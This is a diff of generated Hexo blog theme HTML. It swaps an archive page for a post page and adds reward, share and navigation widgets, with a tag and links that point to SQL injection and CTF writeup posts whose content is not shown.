+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="https://ws1.sinaimg.cn/large/006Xmmmgly1g5wqd9c77wj309a0980u1.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">爬虫</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/31/redtiger-wp/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/07/18/start/" class="archive-article-date">
-  	<time datetime="2019-07-18T03:48:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-18</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/08/29/D1eCTF-web/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">D1eCTF-web</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/07/18/start/">Start</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">start</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/2/">&laquo; Prev</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span>
-    </nav>
+  
+
   
 
 
@@ -260,8 +494,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
